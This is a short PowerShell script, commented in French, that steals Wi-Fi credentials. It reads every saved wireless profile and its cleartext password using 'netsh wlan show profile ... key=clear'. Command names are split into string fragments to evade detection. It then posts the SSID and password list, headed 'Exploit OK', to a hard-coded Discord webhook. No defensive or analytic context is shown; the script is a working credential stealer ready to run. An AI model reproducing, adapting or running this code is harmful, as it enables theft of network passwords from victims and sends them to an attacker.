# --- CONFIGURATION ---
$hook = "https://discord.com/api/webhooks/1484236898066104430/Xj7jxYakm87P19-WQVb8yi6tcNfpFrwPscNE8dIlVw_TsYv4IkQh9gku_p_Giizyo3Ro"

# --- RÉCUPÉRATION ---
$n="ne"+"tsh"; $w="wl"+"an"; $p="pro"+"file"; $k="cle"+"ar"
$res = (& $n $w show $p) | Select-String "\:(.+)$" | %{
    $name = $_.Matches.Groups[1].Value.Trim()
    $details = & $n $w show $p name="$name" key=$k
    $match = $details | Select-String ("Cont"+"enu de la cl"+"e|K"+"ey Con"+"tent")
    $pass = if($match){$match.ToString().Split(":")[1].Trim()}else{"[Open]"}
    "SSID: $name | Pass: $pass"
}

# --- ENVOI DISCORD (Syntaxe simplifiée sans accents graves) ---
$flatList = $res -join "\n"
$payload = @{ content = "Exploit OK\n$flatList" }
Invoke-RestMethod -Uri $hook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json"
